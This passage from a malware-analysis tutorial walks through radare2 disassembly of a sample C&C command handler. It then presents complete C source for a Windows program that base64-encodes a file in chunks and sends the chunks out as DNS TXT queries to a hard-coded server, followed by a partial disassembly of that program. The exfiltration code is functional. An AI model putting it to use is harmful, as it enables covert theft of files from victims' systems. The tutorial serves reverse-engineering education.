|       |   0x004016dc      488b45d8       mov rax, qword [local_28h]
|       |   0x004016e0      41b930000000   mov r9d, 0x30               ; '0' ; 48
|       |   0x004016e6      4c8d05133900.  lea r8, str.pwned           ; section..rdata ; 0x405000 ; "pwned"
|       |   0x004016ed      4889c2         mov rdx, rax
|       |   0x004016f0      b900000000     mov ecx, 0
|       |   0x004016f5      488b05387d00.  mov rax, qword sym.imp.USER32.dll_MessageBoxA ; [0x409434:8]=0x97d2 reloc.USER32.dll_MessageBoxA
|       |   0x004016fc      ffd0           call rax
|       |   0x004016fe      8945d4         mov dword [local_2ch], eax
|       |   0x00401701      4889dc         mov rsp, rbx
|      ,==< 0x00401704      e9dc000000     jmp 0x4017e5
|      ||   ; CODE XREF from 0x0040165e (sym.processCommand)
|      |`-> 0x00401709      807def32       cmp byte [local_11h], 0x32  ; [0x32:1]=255 ; '2' ; 50
|      |,=< 0x0040170d      0f85b8000000   jne 0x4017cb
|      ||   0x00401713      4889e0         mov rax, rsp
|      ||   0x00401716      4889c3         mov rbx, rax
|      ||   0x00401719      c745bc000000.  mov dword [local_44h], 0
|      ||   0x00401720      488b4d40       mov rcx, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|      ||   0x00401724      e8ef1a0000     call sym.strlen             ; size_t strlen(const char *s)
|      ||   0x00401729      4883e802       sub rax, 2
|      ||   0x0040172d      4889c2         mov rdx, rax
|      ||   0x00401730      4883ea01       sub rdx, 1
|      ||   0x00401734      488955c8       mov qword [local_38h], rdx
|      ||   0x00401738      4989c4         mov r12, rax
|      ||   0x0040173b      41bd00000000   mov r13d, 0
|      ||   0x00401741      4889c6         mov rsi, rax
|      ||   0x00401744      bf00000000     mov edi, 0
|      ||   0x00401749      4883c00f       add rax, 0xf
|      ||   0x0040174d      48c1e804       shr rax, 4
|      ||   0x00401751      48c1e004       shl rax, 4
|      ||   0x00401755      e8461a0000     call fcn.004031a0
|      ||   0x0040175a      4829c4         sub rsp, rax
|      ||   0x0040175d      488d442420     lea rax, [local_20h]        ; 0x20 ; 32
|      ||   0x00401762      4883c000       add rax, 0
|      ||   0x00401766      488945c0       mov qword [local_40h], rax
|      ||   0x0040176a      488b4d40       mov rcx, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|      ||   0x0040176e      e8a51a0000     call sym.strlen             ; size_t strlen(const char *s)
|      ||   0x00401773      488d48fe       lea rcx, [rax - 2]
|      ||   0x00401777      488b4540       mov rax, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|      ||   0x0040177b      488d5002       lea rdx, [rax + 2]          ; 2
|      ||   0x0040177f      488b45c0       mov rax, qword [local_40h]
|      ||   0x00401783      4989c8         mov r8, rcx
|      ||   0x00401786      4889c1         mov rcx, rax
|      ||   0x00401789      e87a1a0000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|      ||   0x0040178e      488b45c0       mov rax, qword [local_40h]
|      ||   0x00401792      488d55bc       lea rdx, [local_44h]
|      ||   0x00401796      4989d0         mov r8, rdx
|      ||   0x00401799      488d15663800.  lea rdx, [0x00405006]       ; "%d"
|      ||   0x004017a0      4889c1         mov rcx, rax
|      ||   0x004017a3      e8781a0000     call sym.sscanf             ; int sscanf(const char *s, const char *format,   ...)
|      ||   0x004017a8      488b45c0       mov rax, qword [local_40h]
|      ||   0x004017ac      ba84030000     mov edx, 0x384              ; 900
|      ||   0x004017b1      89c1           mov ecx, eax
|      ||   0x004017b3      488b05ba7a00.  mov rax, qword sym.imp.KERNEL32.dll_Beep ; [0x409274:8]=0x9484 reloc.KERNEL32.dll_Beep
|      ||   0x004017ba      ffd0           call rax
|      ||   0x004017bc      b905000000     mov ecx, 5
|      ||   0x004017c1      e81a1a0000     call sym.sleep              ; int sleep(int s)
|      ||   0x004017c6      4889dc         mov rsp, rbx
|     ,===< 0x004017c9      eb1a           jmp 0x4017e5
|     |||   ; CODE XREF from 0x0040170d (sym.processCommand)
|     ||`-> 0x004017cb      807def33       cmp byte [local_11h], 0x33  ; [0x33:1]=255 ; '3' ; 51
|     ||,=< 0x004017cf      750a           jne 0x4017db
|     |||   0x004017d1      b900000000     mov ecx, 0
|     |||   0x004017d6      e88d1a0000     call sym.exit
|     |||   ; CODE XREF from 0x004017cf (sym.processCommand)
|     ||`-> 0x004017db      b90a000000     mov ecx, 0xa
|     ||    0x004017e0      e8fb190000     call sym.sleep              ; int sleep(int s)
|     ||    ; CODE XREF from 0x00401704 (sym.processCommand)
|     ||    ; CODE XREF from 0x004017c9 (sym.processCommand)
|     ``--> 0x004017e5      90             nop
|           0x004017e6      488d65f8       lea rsp, [local_8h]
|           0x004017ea      5b             pop rbx
|           0x004017eb      5e             pop rsi
|           0x004017ec      5f             pop rdi
|           0x004017ed      415c           pop r12
|           0x004017ef      415d           pop r13
|           0x004017f1      415e           pop r14
|           0x004017f3      415f           pop r15
|           0x004017f5      5d             pop rbp
\           0x004017f6      c3             ret
[0x00401634]>                                                                                           
```

As you see, the recived command, will first contain a (char) number, 1, 2 or 3

And according to that number some action will be done inside this function, we can see that by examining those CMP instructions:
```
|           0x0040165a      807def31       cmp byte [local_11h], 0x31  ; [0x31:1]=255 ; '1' ; 49
|       ,=< 0x0040165e      0f85a5000000   jne 0x401709
|       |   0x00401664      4889e0         mov rax, rsp
```
The first one will run a MessageBox
```
|       |   0x004016bc      e8571b0000     call sym.strlen             ; size_t strlen(const char *s)
|       |   0x004016c1      488d48fe       lea rcx, [rax - 2]
|       |   0x004016c5      488b4540       mov rax, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|       |   0x004016c9      488d5002       lea rdx, [rax + 2]          ; 2
|       |   0x004016cd      488b45d8       mov rax, qword [local_28h]
|       |   0x004016d1      4989c8         mov r8, rcx
|       |   0x004016d4      4889c1         mov rcx, rax
|       |   0x004016d7      e82c1b0000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|       |   0x004016dc      488b45d8       mov rax, qword [local_28h]
|       |   0x004016e0      41b930000000   mov r9d, 0x30               ; '0' ; 48
|       |   0x004016e6      4c8d05133900.  lea r8, str.pwned           ; section..rdata ; 0x405000 ; "pwned"
|       |   0x004016ed      4889c2         mov rdx, rax
|       |   0x004016f0      b900000000     mov ecx, 0
|       |   0x004016f5      488b05387d00.  mov rax, qword sym.imp.USER32.dll_MessageBoxA ; [0x409434:8]=0x97d2 reloc.USER32.dll_MessageBoxA
```
Second one will do a Sleep (and a call to an "unknown func")
```
|      ||   0x0040172d      4889c2         mov rdx, rax
|      ||   0x00401730      4883ea01       sub rdx, 1
|      ||   0x00401734      488955c8       mov qword [local_38h], rdx
|      ||   0x00401738      4989c4         mov r12, rax
|      ||   0x0040173b      41bd00000000   mov r13d, 0
|      ||   0x00401741      4889c6         mov rsi, rax
|      ||   0x00401744      bf00000000     mov edi, 0
|      ||   0x00401749      4883c00f       add rax, 0xf
|      ||   0x0040174d      48c1e804       shr rax, 4
|      ||   0x00401751      48c1e004       shl rax, 4
|      ||   0x00401755      e8461a0000     call fcn.004031a0
|      ||   0x0040175a      4829c4         sub rsp, rax
|      ||   0x0040175d      488d442420     lea rax, [local_20h]        ; 0x20 ; 32
|      ||   0x00401762      4883c000       add rax, 0
|      ||   0x00401766      488945c0       mov qword [local_40h], rax
|      ||   0x0040176a      488b4d40       mov rcx, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|      ||   0x0040176e      e8a51a0000     call sym.strlen             ; size_t strlen(const char *s)
|      ||   0x00401773      488d48fe       lea rcx, [rax - 2]
|      ||   0x00401777      488b4540       mov rax, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|      ||   0x0040177b      488d5002       lea rdx, [rax + 2]          ; 2
|      ||   0x0040177f      488b45c0       mov rax, qword [local_40h]
|      ||   0x00401783      4989c8         mov r8, rcx
|      ||   0x00401786      4889c1         mov rcx, rax
|      ||   0x00401789      e87a1a0000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|      ||   0x0040178e      488b45c0       mov rax, qword [local_40h]
|      ||   0x00401792      488d55bc       lea rdx, [local_44h]
|      ||   0x00401796      4989d0         mov r8, rdx
|      ||   0x00401799      488d15663800.  lea rdx, [0x00405006]       ; "%d"
|      ||   0x004017a0      4889c1         mov rcx, rax
|      ||   0x004017a3      e8781a0000     call sym.sscanf             ; int sscanf(const char *s, const char *format,   ...)
|      ||   0x004017a8      488b45c0       mov rax, qword [local_40h]
|      ||   0x004017ac      ba84030000     mov edx, 0x384              ; 900
|      ||   0x004017b1      89c1           mov ecx, eax
|      ||   0x004017b3      488b05ba7a00.  mov rax, qword sym.imp.KERNEL32.dll_Beep ; [0x409274:8]=0x9484 reloc.KERNEL32.dll_Beep
|      ||   0x004017ba      ffd0           call rax
|      ||   0x004017bc      b905000000     mov ecx, 5
```
Then option 3 will just quit the program
```
|     |||   ; CODE XREF from 0x0040170d (sym.processCommand)
|     ||`-> 0x004017cb      807def33       cmp byte [local_11h], 0x33  ; [0x33:1]=255 ; '3' ; 51
|     ||,=< 0x004017cf      750a           jne 0x4017db
|     |||   0x004017d1      b900000000     mov ecx, 0
|     |||   0x004017d6      e88d1a0000     call sym.exit
```
And after that a simple sleep will be run.

A good exercise for you here is to create a script with the python radare2 binding

And log all the parameters passed to this function, like the following:
```
[0x0040165a]> afvd
arg arg_40h = 0x0060fb10  0x000000000060fb40   @.`..... (PRIVATE  ) r11 (1:secret message one)
```
To create a record on what the CandC server is actually sending. That is commonly done in malware analysis, especially when it comes to stuff like DDOS botnets cause it may be interesting to see how the targets are evolving

In this case we see that 1 is the option, and secret message one the string.

As we can see, a MessageBox should pop with "secret message one" as its text, no mystery. But what about that mysterious function, it is your turn to (not discover, cause you already know from the code) but to explain what it does, try to use WA to edit the code and make the program go there instead.

And that it is. Let's move to the next example

#### Base64 encoding/decoding in C and File exfiltration through DNS 

So I guess you already know about base64. It is used to encode any kind of file inside a string/text. Comes in very handy when you want to send non text files easily over the network. Especially when dealing with protocols like HTTP when everything is ASCII and a null byte may break the thing.


In this DNS example, we can use it to encode a file and send it over the network, the thing is, that file can be a text file or any other kind of file like an image, a exe, audio file or whatever.

I use the following libs for the b64 encoding:

- https://web.mit.edu/freebsd/head/contrib/wpa/src/utils/base64.c
- https://web.mit.edu/freebsd/head/contrib/wpa/src/utils/base64.h

Pure copy and paste, you'll probably need to import some extra libraries for the NULL and size_t variables to work, or you can just substitute them with 0's and short ints I guess.

And the progam is this one: 
```c 
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#pragma comment(lib, "ws2_32")
#define BUFLEN 65536
#define CHUNKSIZE 25
struct dns_header
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

struct question{
    unsigned short type;
    unsigned short tclass;
};

typedef struct
{
    unsigned char *name;
    struct question *ques;
} query;


void sendFile(char * file){

    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;


	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }

    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");


    unsigned char buf[65536],*qname,*reader;

    struct question *qinfo = NULL;
    struct dns_header *dns = NULL;

    // DNS QUERY HEADERS SETUP
    dns = (struct dns_header *)&buf;
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;


    DWORD  dwBytesRead = 0;
    char   ReadBuffer[CHUNKSIZE] = {0};
    int err;
    short totalBytesRead = 0;
    int r = 0;
    int i = 0;
    int hFile = CreateFile(file   ,            // file to open
                       GENERIC_READ,          // open for read
                       FILE_SHARE_READ,       // share for read
                       NULL,                  // default security
                       OPEN_EXISTING,         // existing file only
                       FILE_ATTRIBUTE_NORMAL, // normal file
                       NULL);
    int fsize = GetFileSize(hFile, NULL);

    while(totalBytesRead < fsize){

            ReadFile(hFile, ReadBuffer, CHUNKSIZE-1, &dwBytesRead, NULL);
            char *res= base64_encode(ReadBuffer,dwBytesRead,&i);
            char message[i+1];
            message[0] = i;
            strncpy(message+1,res,i+1);

            // DNS QUESTION
            qname =(unsigned char*)&buf[sizeof(struct dns_header)];
            strncpy(qname, message, i+1);

            // UPDATE THE QUERY BUFFER
            qinfo =(struct question*)&buf[sizeof(struct dns_header) + (strlen((const char*)qname) + 1)];
            // SET CLASS
            qinfo->type = htons(16); // 1 == 'A', 16 == 'TXT', we ask for TXT registers
            qinfo->tclass = htons(1); // 1 = INTERNET

            if (sendto(sock,(char*)buf,sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question) , 0 , (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
                printf("sendto() failed with error code : %d ", WSAGetLastError());
                exit(EXIT_FAILURE);
            }
            else{
                printf("%d bytes now sent\n", totalBytesRead);
            }
            sleep(1);
            totalBytesRead += dwBytesRead;
    }
}

int main()
{

    char * file = "C:\\samples\\newfile.txt";
    printf("Hello base64!, now sending: %s \n", file);
    sendFile(file);

    return 0;
}
```

Again, pretty similar but this time we see a combination of pieces of code we already worked with, this time with base64 encoding within.

The progam will read the newfile.txt file from disk, chunk by chunk, encoding each chunk in base64 and sending it as a DNS query to a remote server, it'll wait 1 second between each query.

And again, sorry for this extra large output

Let's see:

```
[0x00401b80]> pdf
/ (fcn) sym.sendFile 1250
|   sym.sendFile (int arg_10010h, int arg_10012h, int arg_10014h, int arg_10020h, int arg_101b8h, int arg_101c0h, int arg_101c8h, int arg_101d0h, int arg_101dch, int arg_101e0h, int arg_101e4h, int arg_101e8h, int arg_101f0h, int arg_101f8h, int arg_10204h, int arg_1020ah, int arg_1020ch, int arg_10218h, int arg_10250h, int arg_30h, int arg_40h, int arg_80h);
|           ; var int local_34h @ rbp-0x34
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; var int local_14h @ rbp-0x14
|           ; var int local_10h @ rbp-0x10
|           ; arg int arg_10010h @ rbp+0x10010
|           ; arg int arg_10012h @ rbp+0x10012
|           ; arg int arg_10014h @ rbp+0x10014
|           ; arg int arg_10020h @ rbp+0x10020
|           ; arg int arg_101b8h @ rbp+0x101b8
|           ; arg int arg_101c0h @ rbp+0x101c0
|           ; arg int arg_101c8h @ rbp+0x101c8
|           ; arg int arg_101d0h @ rbp+0x101d0
|           ; arg int arg_101dch @ rbp+0x101dc
|           ; arg int arg_101e0h @ rbp+0x101e0
|           ; arg int arg_101e4h @ rbp+0x101e4
|           ; arg int arg_101e8h @ rbp+0x101e8
|           ; arg int arg_101f0h @ rbp+0x101f0
|           ; arg int arg_101f8h @ rbp+0x101f8
|           ; arg int arg_10204h @ rbp+0x10204
|           ; arg int arg_1020ah @ rbp+0x1020a
|           ; arg int arg_1020ch @ rbp+0x1020c
|           ; arg int arg_10218h @ rbp+0x10218
|           ; arg int arg_10250h @ rbp+0x10250
|           ; var int local_20h_2 @ rsp+0x20
|           ; var int local_28h_2 @ rsp+0x28
|           ; arg int arg_30h @ rsp+0x30
|           ; arg int arg_40h @ rsp+0x40
|           ; arg int arg_80h @ rsp+0x80
|           ; CALL XREF from 0x00402094 (sym.main)
|           0x00401b80      55             push rbp
|           0x00401b81      4155           push r13
|           0x00401b83      4154           push r12
|           0x00401b85      57             push rdi
|           0x00401b86      56             push rsi
|           0x00401b87      53             push rbx
|           0x00401b88      b898020100     mov eax, 0x10298
|           0x00401b8d      e8ce190000     call fcn.00403560
|           0x00401b92      4829c4         sub rsp, rax
|           0x00401b95      488dac248000.  lea rbp, [arg_80h]          ; 0x80 ; 128
|           0x00401b9d      48898d500201.  mov qword [arg_10250h], rcx ; [0x10250:8]=0
|           0x00401ba4      c7850c020100.  mov dword [arg_1020ch], 0x10 ; 16
|           0x00401bae      c78504020100.  mov dword [arg_10204h], 0x35 ; '5' ; 53
|           0x00401bb8      488d85200001.  lea rax, [arg_10020h]       ; 0x10020
|           0x00401bbf      4889c2         mov rdx, rax
|           0x00401bc2      b902020000     mov ecx, 0x202              ; 514
|           0x00401bc7      488b05527800.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x409420:8]=0x97c8 reloc.WS2_32.dll_WSAStartup
|           0x00401bce      ffd0           call rax
|           0x00401bd0      85c0           test eax, eax
|       ,=< 0x00401bd2      741c           je 0x401bf0
|       |   0x00401bd4      488b053d7800.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409418:8]=0x97b6 reloc.WS2_32.dll_WSAGetLastError
|       |   0x00401bdb      ffd0           call rax
|       |   0x00401bdd      89c2           mov edx, eax
|       |   0x00401bdf      488d0d7a3400.  lea rcx, str.Failed._Error_Code_:__d ; 0x405060 ; "Failed. Error Code : %d"
|       |   0x00401be6      e8fd190000     call sym.printf             ; int printf(const char *format)
|      ,==< 0x00401beb      e962040000     jmp 0x402052
|      ||   ; CODE XREF from 0x00401bd2 (sym.sendFile)
|      |`-> 0x00401bf0      41b811000000   mov r8d, 0x11               ; 17
|      |    0x00401bf6      ba02000000     mov edx, 2
|      |    0x00401bfb      b902000000     mov ecx, 2
|      |    0x00401c00      488b05397800.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x409440:8]=0x97f4 reloc.WS2_32.dll_socket
|      |    0x00401c07      ffd0           call rax
|      |    0x00401c09      488985f80101.  mov qword [arg_101f8h], rax ; [0x101f8:8]=0
|      |    0x00401c10      4883bdf80101.  cmp qword [arg_101f8h], 0xffffffffffffffff
|      |,=< 0x00401c18      7517           jne 0x401c31
|      ||   0x00401c1a      488b05f77700.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409418:8]=0x97b6 reloc.WS2_32.dll_WSAGetLastError
|      ||   0x00401c21      ffd0           call rax
|      ||   0x00401c23      89c2           mov edx, eax
|      ||   0x00401c25      488d0d4c3400.  lea rcx, str.Could_not_create_socket_:__d ; 0x405078 ; "Could not create socket : %d"
|      ||   0x00401c2c      e8b7190000     call sym.printf             ; int printf(const char *format)
|      ||   ; CODE XREF from 0x00401c18 (sym.sendFile)
|      |`-> 0x00401c31      66c785100001.  mov word [arg_10010h], 2    ; [0x10010:2]=0xfffe
|      |    0x00401c3a      8b8504020100   mov eax, dword [arg_10204h] ; [0x10204:4]=0
|      |    0x00401c40      0fb7c0         movzx eax, ax
|      |    0x00401c43      89c1           mov ecx, eax
|      |    0x00401c45      488b05dc7700.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409428:8]=0x97d6 reloc.WS2_32.dll_htons
|      |    0x00401c4c      ffd0           call rax
|      |    0x00401c4e      668985120001.  mov word [arg_10012h], ax   ; [0x10012:2]=0xffff
|      |    0x00401c55      488d0d393400.  lea rcx, str.192.168.0.50   ; 0x405095 ; "192.168.0.50"
|      |    0x00401c5c      488b05cd7700.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x409430:8]=0x97de reloc.WS2_32.dll_inet_addr
|      |    0x00401c63      ffd0           call rax
|      |    0x00401c65      898514000100   mov dword [arg_10014h], eax ; [0x10014:4]=-1
|      |    0x00401c6b      48c785f00101.  mov qword [arg_101f0h], 0   ; [0x101f0:8]=0
|      |    0x00401c76      48c785e80101.  mov qword [arg_101e8h], 0   ; [0x101e8:8]=0
|      |    0x00401c81      488d45f0       lea rax, [local_10h]
|      |    0x00401c85      488985e80101.  mov qword [arg_101e8h], rax ; [0x101e8:8]=0
|      |    0x00401c8c      e8b7190000     call sym.getpid             ; int getpid(void)
|      |    0x00401c91      0fb7c0         movzx eax, ax
|      |    0x00401c94      89c1           mov ecx, eax
|      |    0x00401c96      488b058b7700.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409428:8]=0x97d6 reloc.WS2_32.dll_htons
|      |    0x00401c9d      ffd0           call rax
|      |    0x00401c9f      89c2           mov edx, eax
|      |    0x00401ca1      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401ca8      668910         mov word [rax], dx
|      |    0x00401cab      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401cb2      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |    0x00401cb6      83e27f         and edx, 0x7f
|      |    0x00401cb9      885002         mov byte [rax + 2], dl
|      |    0x00401cbc      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401cc3      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |    0x00401cc7      83e287         and edx, 0xffffff87
|      |    0x00401cca      885002         mov byte [rax + 2], dl
|      |    0x00401ccd      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401cd4      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |    0x00401cd8      83e2fb         and edx, 0xfffffffb
|      |    0x00401cdb      885002         mov byte [rax + 2], dl
|      |    0x00401cde      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401ce5      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |    0x00401ce9      83e2fd         and edx, 0xfffffffd
|      |    0x00401cec      885002         mov byte [rax + 2], dl
|      |    0x00401cef      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401cf6      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |    0x00401cfa      83ca01         or edx, 1
|      |    0x00401cfd      885002         mov byte [rax + 2], dl
|      |    0x00401d00      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d07      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |    0x00401d0b      83e27f         and edx, 0x7f
|      |    0x00401d0e      885003         mov byte [rax + 3], dl
|      |    0x00401d11      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d18      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |    0x00401d1c      83e2bf         and edx, 0xffffffbf
|      |    0x00401d1f      885003         mov byte [rax + 3], dl
|      |    0x00401d22      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d29      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |    0x00401d2d      83e2df         and edx, 0xffffffdf
|      |    0x00401d30      885003         mov byte [rax + 3], dl
|      |    0x00401d33      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d3a      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |    0x00401d3e      83e2ef         and edx, 0xffffffef
|      |    0x00401d41      885003         mov byte [rax + 3], dl
|      |    0x00401d44      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d4b      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |    0x00401d4f      83e2f0         and edx, 0xfffffff0
|      |    0x00401d52      885003         mov byte [rax + 3], dl
|      |    0x00401d55      b901000000     mov ecx, 1
|      |    0x00401d5a      488b05c77600.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409428:8]=0x97d6 reloc.WS2_32.dll_htons
|      |    0x00401d61      ffd0           call rax
|      |    0x00401d63      89c2           mov edx, eax
|      |    0x00401d65      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d6c      66895004       mov word [rax + 4], dx
|      |    0x00401d70      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d77      66c740060000   mov word [rax + 6], 0
|      |    0x00401d7d      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d84      66c740080000   mov word [rax + 8], 0
|      |    0x00401d8a      488b85e80101.  mov rax, qword [arg_101e8h] ; [0x101e8:8]=0
|      |    0x00401d91      66c7400a0000   mov word [rax + 0xa], 0
|      |    0x00401d97      c745ec000000.  mov dword [local_14h], 0
|      |    0x00401d9e      48c745d00000.  mov qword [local_30h], 0
|      |    0x00401da6      48c745d80000.  mov qword [local_28h], 0
|      |    0x00401dae      48c745e00000.  mov qword [local_20h], 0
|      |    0x00401db6      c645e800       mov byte [local_18h], 0
|      |    0x00401dba      66c7850a0201.  mov word [arg_1020ah], 0    ; [0x1020a:2]=0
|      |    0x00401dc3      c785e4010100.  mov dword [arg_101e4h], 0   ; [0x101e4:4]=0
|      |    0x00401dcd      c745cc000000.  mov dword [local_34h], 0
|      |    0x00401dd4      48c744243000.  mov qword [arg_30h], 0
|      |    0x00401ddd      c74424288000.  mov dword [local_28h_2], 0x80 ; [0x80:4]=-1 ; 128
|      |    0x00401de5      c74424200300.  mov dword [local_20h_2], 3
|      |    0x00401ded      41b900000000   mov r9d, 0
|      |    0x00401df3      41b801000000   mov r8d, 1
|      |    0x00401df9      ba00000080     mov edx, 0x80000000
|      |    0x00401dfe      488b8d500201.  mov rcx, qword [arg_10250h] ; [0x10250:8]=0
|      |    0x00401e05      488b05447400.  mov rax, qword sym.imp.KERNEL32.dll_CreateFileA ; [0x409250:8]=0x9450 reloc.KERNEL32.dll_CreateFileA ; "P\x94"
|      |    0x00401e0c      ffd0           call rax
|      |    0x00401e0e      8985e0010100   mov dword [arg_101e0h], eax ; [0x101e0:4]=0
|      |    0x00401e14      8b85e0010100   mov eax, dword [arg_101e0h] ; [0x101e0:4]=0
|      |    0x00401e1a      4898           cdqe
|      |    0x00401e1c      ba00000000     mov edx, 0
|      |    0x00401e21      4889c1         mov rcx, rax
|      |    0x00401e24      488b05557400.  mov rax, qword sym.imp.KERNEL32.dll_GetFileSize ; [0x409280:8]=0x94ce reloc.KERNEL32.dll_GetFileSize
|      |    0x00401e2b      ffd0           call rax
|      |    0x00401e2d      8985dc010100   mov dword [arg_101dch], eax ; [0x101dc:4]=0
|      |,=< 0x00401e33      e907020000     jmp 0x40203f
|      ||   ; CODE XREF from 0x0040204c (sym.sendFile)
|     .---> 0x00401e38      4889e0         mov rax, rsp
|     :||   0x00401e3b      4889c7         mov rdi, rax
|     :||   0x00401e3e      8b85e0010100   mov eax, dword [arg_101e0h] ; [0x101e0:4]=0
|     :||   0x00401e44      4898           cdqe
|     :||   0x00401e46      4889c1         mov rcx, rax
|     :||   0x00401e49      488d55ec       lea rdx, [local_14h]
|     :||   0x00401e4d      488d45d0       lea rax, [local_30h]
|     :||   0x00401e51      48c744242000.  mov qword [local_20h_2], 0
|     :||   0x00401e5a      4989d1         mov r9, rdx
|     :||   0x00401e5d      41b818000000   mov r8d, 0x18               ; 24
|     :||   0x00401e63      4889c2         mov rdx, rax
|     :||   0x00401e66      488b05537400.  mov rax, qword sym.imp.KERNEL32.dll_ReadFile ; [0x4092c0:8]=0x9576 reloc.KERNEL32.dll_ReadFile ; "v\x95"
|     :||   0x00401e6d      ffd0           call rax
|     :||   0x00401e6f      8b55ec         mov edx, dword [local_14h]
|     :||   0x00401e72      488d4dcc       lea rcx, [local_34h]
|     :||   0x00401e76      488d45d0       lea rax, [local_30h]
|     :||   0x00401e7a      4989c8         mov r8, rcx
|     :||   0x00401e7d      4889c1         mov rcx, rax
|     :||   0x00401e80      e8cbf6ffff     call sym.base64_encode
|     :||   0x00401e85      4898           cdqe
|     :||   0x00401e87      488985d00101.  mov qword [arg_101d0h], rax ; [0x101d0:8]=0
|     :||   0x00401e8e      8b45cc         mov eax, dword [local_34h]
|     :||   0x00401e91      83c001         add eax, 1
|     :||   0x00401e94      4863d0         movsxd rdx, eax
|     :||   0x00401e97      4883ea01       sub rdx, 1
|     :||   0x00401e9b      488995c80101.  mov qword [arg_101c8h], rdx ; [0x101c8:8]=0
|     :||   0x00401ea2      4863d0         movsxd rdx, eax
|     :||   0x00401ea5      4889d3         mov rbx, rdx
|     :||   0x00401ea8      be00000000     mov esi, 0
|     :||   0x00401ead      4863d0         movsxd rdx, eax
|     :||   0x00401eb0      4989d4         mov r12, rdx
|     :||   0x00401eb3      41bd00000000   mov r13d, 0
|     :||   0x00401eb9      4898           cdqe
|     :||   0x00401ebb      4883c00f       add rax, 0xf
|     :||   0x00401ebf      48c1e804       shr rax, 4
|     :||   0x00401ec3      48c1e004       shl rax, 4
|     :||   0x00401ec7      e894160000     call fcn.00403560
